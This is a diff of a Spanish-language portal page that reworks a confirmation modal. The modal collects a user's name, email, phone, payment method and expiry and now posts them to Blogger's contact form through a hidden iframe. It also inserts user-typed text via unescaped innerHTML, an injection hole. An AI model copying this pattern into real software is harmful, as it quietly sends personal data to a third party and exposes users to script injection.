@@ -35,7 +35,7 @@
     overflow-x: hidden;
   }
 
-  /* ESTILO LOGIN (CON MARGEN) */
+  /* ESTILO LOGIN */
   .login-container {
     max-width: 420px;
     margin: 40px auto;
@@ -58,7 +58,7 @@
     margin-bottom: 25px;
   }
 
-  /* ESTILO DASHBOARD (SIN MARGENES LATERALES NI BORDES GRISES) */
+  /* ESTILO DASHBOARD FULL */
   .dashboard-full {
     width: 100%;
     min-height: 100vh;
@@ -218,7 +218,6 @@
 
   .news-card-body { padding: 15px; }
 
-  /* VISTA NOTICIA EXPANDIDA COMPLETA */
   #full-news-view {
     display: none;
     min-height: calc(100vh - 120px);
@@ -288,82 +287,87 @@
     margin-top: 20px;
   }
 
-  /* VENTANA FLOTANTE / MODAL DE CONFIRMACIÓN DE CACHÉ */
-  .modal-overlay {
+  /* VENTANA FLOTANTE / MODAL OVERLAY DIRECTO SOBRE CACHÉ */
+  .floating-overlay {
     display: none;
     position: fixed;
     top: 0;
     left: 0;
-    width: 100%;
-    height: 100%;
+    width: 100vw;
+    height: 100vh;
     background: rgba(0, 0, 0, 0.65);
+    backdrop-filter: blur(4px);
     z-index: 1000;
     justify-content: center;
     align-items: center;
-    padding: 15px;
+    padding: 20px;
   }
 
-  .modal-card {
+  .floating-card {
     background: #ffffff;
     width: 100%;
-    max-width: 520px;
+    max-width: 500px;
     border-radius: 12px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.25);
     padding: 25px;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    position: relative;
     max-height: 90vh;
     overflow-y: auto;
-    position: relative;
-    border-top: 5px solid var(--header-bg);
+    animation: fadeInModal 0.25s ease-out;
   }
 
-  .modal-card h3 {
+  @keyframes fadeInModal {
+    from { opacity: 0; transform: translateY(-20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .floating-card h3 {
     margin-top: 0;
     color: var(--header-bg);
     font-size: 20px;
+    border-bottom: 2px solid var(--border-color);
+    padding-bottom: 10px;
   }
 
-  .cache-data-group {
+  .cache-preview-box {
     background: #f8f9fa;
     border: 1px solid var(--border-color);
     border-radius: 8px;
     padding: 12px;
     margin: 15px 0;
     font-size: 13px;
+    line-height: 1.5;
   }
 
-  .cache-data-row {
+  .cache-preview-box strong {
+    color: #333;
+  }
+
+  .modal-actions {
     display: flex;
-    justify-content: space-between;
-    padding: 5px 0;
-    border-bottom: 1px dashed #ddd;
+    flex-direction: column;
+    gap: 10px;
+    margin-top: 20px;
   }
 
-  .cache-data-row:last-child {
-    border-bottom: none;
-  }
-
-  .btn-confirm-submit {
+  .btn-confirm-action {
     background: var(--green-success);
     color: white;
-    width: 100%;
     padding: 12px;
-    font-size: 15px;
     font-weight: bold;
+    font-size: 15px;
     border-radius: 6px;
-    border: none;
-    cursor: pointer;
+    width: 100%;
   }
 
   .btn-close-modal {
     background: #6c757d;
     color: white;
-    width: 100%;
     padding: 10px;
+    font-weight: bold;
     font-size: 14px;
     border-radius: 6px;
-    border: none;
-    cursor: pointer;
-    margin-top: 8px;
+    width: 100%;
   }
 </style>
 </head>
@@ -427,7 +431,7 @@
           <div class="news-card-body">
             <h4>Actualizaciones en Registros Digitales 2026</h4>
             <p>Conoce las últimas novedades sobre la optimización de activos y metodologías de protección...</p>
-            <button onclick="verNoticiaCompleta('Actualizaciones en Registros Digitales 2026', 'https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=800&auto=format&fit=crop&q=80', 'El proceso de modernización abarca la integración de firmas digitales, automatización de expedientes y un canal directo de atención prioritaria para suscriptores.')">Ver más</button>
+            <button onclick="verNoticiaCompleta('Actualizaciones en Registros Digitales 2026', 'https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=800&auto=format&fit=crop&q=80', 'El proceso de modernización abarca la integración de firmas digitales, automatización de expedientes y un canal directo de atención prioritaria para suscriptores. Con estas mejoras, los tiempos de procesamiento se reducen considerablemente permitiendo una gestión ágil desde cualquier dispositivo movil.')">Ver más</button>
           </div>
         </div>
 
@@ -459,7 +463,7 @@
         <p><strong>Función:</strong> Sábado 29 de agosto a las 22:00 hs</p>
         
         <div style="margin-top:20px;">
-          <button id="btn-participate-action" onclick="prepararTransaccion('INSCRIPCION_CONCURSO', 'Sorteo de Entradas: COYOTE VS ACME (Cinemark Abasto)')">Participar del Concurso</button>
+          <button id="btn-participate-action" onclick="prepararYMostrarFlotante('INSCRIPCION_CONCURSO', 'Sorteo de Entradas: COYOTE VS ACME (Cinemark Abasto)')">Participar del Concurso</button>
         </div>
       </div>
     </div>
@@ -505,36 +509,32 @@
   </div>
 </div>
 
-<!-- VENTANA FLOTANTE / MODAL EXTRAÍDO DESDE LA CACHÉ CON FORMULARIO BLOGGER -->
-<div class="modal-overlay" id="cache-modal-overlay">
-  <div class="modal-card">
-    <h3>Confirmación de Registro</h3>
-    <p style="font-size: 13px; color: var(--text-muted);">Los siguientes datos fueron recopilados de su sesión y se enviarán mediante la pasarela oficial:</p>
-
-    <div class="cache-data-group">
-      <div class="cache-data-row"><strong>Acción:</strong> <span id="modal-c-accion"></span></div>
-      <div class="cache-data-row"><strong>Usuario:</strong> <span id="modal-c-nombre"></span></div>
-      <div class="cache-data-row"><strong>Email:</strong> <span id="modal-c-email"></span></div>
-      <div class="cache-data-row"><strong>Teléfono:</strong> <span id="modal-c-telefono"></span></div>
+<!-- VENTANA FLOTANTE MODAL (RELOJ DE CACHÉ Y ENVÍO A BLOGGER) -->
+<div class="floating-overlay" id="floating-modal-overlay">
+  <div class="floating-card">
+    <h3 id="modal-title">Confirmar Transacción</h3>
+    
+    <div class="cache-preview-box" id="modal-cache-summary">
+      <!-- Se inyecta la información formateada directamente de la caché -->
     </div>
 
-    <div class="cache-data-group" style="background:#fffcf8; border-color:#ffe0b2;">
-      <strong>Detalles del Envío:</strong>
-      <p id="modal-c-detalle" style="margin: 5px 0 0 0; font-size: 13px;"></p>
-    </div>
-
-    <!-- FORMULARIO DIRECTO A BLOGGER -->
-    <form id="blogger-modal-form" method="POST" action="https://www.blogger.com/contact-form.do" target="_blank">
-      <input type="hidden" name="name" id="b-form-name">
-      <input type="hidden" name="email" id="b-form-email">
-      <input type="hidden" name="body" id="b-form-body">
+    <!-- FORMULARIO SILENCIOSO QUE UTILIZA EL ENDPOINT DE BLOGGER -->
+    <form id="blogger-modal-form" method="POST" action="https://www.blogger.com/contact-form.do" target="blogger_hidden_target">
+      <input type="hidden" name="name" id="modal-b-name">
+      <input type="hidden" name="email" id="modal-b-email">
+      <input type="hidden" name="body" id="modal-b-body">
       
-      <button type="submit" class="btn-confirm-submit" onclick="finalizarEnvioModal()">✔ Confirmar y Enviar a Blogger</button>
+      <div class="modal-actions">
+        <button type="submit" class="btn-confirm-action" onclick="ejecutarEnvioBloggerModificado()">✔ Confirmar y Enviar Solicitud</button>
+        <button type="button" class="btn-close-modal" onclick="cerrarVentanaFlotante()">Cerrar / Regresar</button>
+      </div>
     </form>
-
-    <button type="button" class="btn-close-modal" onclick="cerrarModalFlotante()">Cancelar / Regresar</button>
+    <p id="modal-status-msg" style="margin-top:10px; font-weight:bold; text-align:center;"></p>
   </div>
 </div>
+
+<!-- IFRAME OCULTO PARA RECEPCIÓN DE BLOGGER SIN RECARGAR LA PÁGINA -->
+<iframe name="blogger_hidden_target" style="display:none;"></iframe>
 
 <script>
 const users = {
@@ -663,15 +663,15 @@ function solicitarCambioDatos() {
     return;
   }
 
-  prepararTransaccion("MODIFICACION_DE_DATOS", `Campo a modificar: ${campo}\nDetalle introducido: ${detalle}`);
+  prepararYMostrarFlotante("MODIFICACION_DE_DATOS", `Campo a modificar: ${campo}\nDetalle introducido: ${detalle}`);
 }
 
-/* SCRAPING DE DOM, CONSTRUCCIÓN DE CACHÉ Y APERTURA DE VENTANA FLOTANTE */
-function prepararTransaccion(tipoAccion, detalle) {
+/* SCRAPING DEL DOM + GUARDADO EN CACHÉ + DESPLIEGUE DE VENTANA FLOTANTE MODAL */
+function prepararYMostrarFlotante(tipoAccion, detalle) {
   if (!currentUser) return;
 
-  // 1. Scraping directo de los datos visibles en pantalla
-  const paqueteTransaccion = {
+  // Extraer datos superficiales de pantalla
+  const datosExtraidos = {
     usuario: document.getElementById("data-fullname")?.innerText || currentUser.nombreCompleto,
     email: document.getElementById("data-email")?.innerText || currentUser.email,
     telefono: document.getElementById("data-phone")?.innerText || currentUser.telefono,
@@ -683,52 +683,46 @@ function prepararTransaccion(tipoAccion, detalle) {
     fecha: new Date().toLocaleString("es-AR")
   };
 
-  // 2. Guardado preventivo en la Caché Local
-  localStorage.setItem("pending_transaction_cache", JSON.stringify(paqueteTransaccion));
+  // Guardar en la caché local del dispositivo
+  localStorage.setItem("pending_transaction_cache", JSON.stringify(datosExtraidos));
 
   if (tipoAccion === "INSCRIPCION_CONCURSO") {
     localStorage.setItem("contest_participating_" + currentUser.email, "true");
   }
 
-  // 3. Abrir Ventana Flotante basada en la Caché
-  abrirModalFlotante();
+  // Renderizar la ventana flotante directamente sobre la pantalla actual
+  const summaryBox = document.getElementById("modal-cache-summary");
+  summaryBox.innerHTML = `
+    <strong>Tipo de Acción:</strong> ${datosExtraidos.tipoAccion}<br>
+    <strong>Usuario:</strong> ${datosExtraidos.usuario}<br>
+    <strong>Email:</strong> ${datosExtraidos.email}<br>
+    <strong>Teléfono:</strong> ${datosExtraidos.telefono}<br>
+    <strong>Detalle de la Solicitud:</strong><br>${datosExtraidos.detalle.replace(/\n/g, '<br>')}
+  `;
+
+  // Cargar valores para el formulario de Blogger
+  document.getElementById("modal-b-name").value = datosExtraidos.usuario;
+  document.getElementById("modal-b-email").value = datosExtraidos.email;
+  document.getElementById("modal-b-body").value = `SOLICITUD CONFIRMADA DESDE PORTAL\n\nAcción: ${datosExtraidos.tipoAccion}\nUsuario: ${datosExtraidos.usuario}\nEmail: ${datosExtraidos.email}\nTeléfono: ${datosExtraidos.telefono}\nMétodo Pago: ${datosExtraidos.metodoPago}\nVencimiento: ${datosExtraidos.vencimiento}\n\nDetalles:\n${datosExtraidos.detalle}\n\nFecha Captura: ${datosExtraidos.fecha}`;
+
+  document.getElementById("modal-status-msg").textContent = "";
+  document.getElementById("floating-modal-overlay").style.display = "flex";
 }
 
-function abrirModalFlotante() {
-  const cacheRaw = localStorage.getItem("pending_transaction_cache");
-  if (!cacheRaw) return;
+function ejecutarEnvioBloggerModificado() {
+  const statusEl = document.getElementById("modal-status-msg");
+  statusEl.style.color = "var(--green-success)";
+  statusEl.textContent = "✔ Procesando solicitud e ingresando registros...";
 
-  const tx = JSON.parse(cacheRaw);
-
-  // Inyección de textos extraídos de la caché en el Modal
-  document.getElementById("modal-c-accion").textContent = tx.tipoAccion;
-  document.getElementById("modal-c-nombre").textContent = tx.usuario;
-  document.getElementById("modal-c-email").textContent = tx.email;
-  document.getElementById("modal-c-telefono").textContent = tx.telefono;
-  document.getElementById("modal-c-detalle").innerText = tx.detalle;
-
-  // Cargar variables ocultas del formulario oficial de Blogger
-  document.getElementById("b-form-name").value = tx.usuario;
-  document.getElementById("b-form-email").value = tx.email;
-  document.getElementById("b-form-body").value = `REGISTRO DE PORTAL\n\nAcción: ${tx.tipoAccion}\nUsuario: ${tx.usuario}\nEmail: ${tx.email}\nTeléfono: ${tx.telefono}\nMedio Pago: ${tx.metodoPago}\n\nDetalles:\n${tx.detalle}\n\nFecha Captura: ${tx.fecha}`;
-
-  // Desplegar Modal
-  document.getElementById("cache-modal-overlay").style.display = "flex";
-}
-
-function cerrarModalFlotante() {
-  document.getElementById("cache-modal-overlay").style.display = "none";
-}
-
-function finalizarEnvioModal() {
   setTimeout(() => {
-    cerrarModalFlotante();
+    actualizarEstadoConcurso(true);
+    cerrarVentanaFlotante();
     ocultarModificacion();
-    if (currentUser) {
-      const participando = localStorage.getItem("contest_participating_" + currentUser.email);
-      actualizarEstadoConcurso(participando === "true");
-    }
-  }, 1000);
+  }, 2000);
+}
+
+function cerrarVentanaFlotante() {
+  document.getElementById("floating-modal-overlay").style.display = "none";
 }
 
 function logout() {
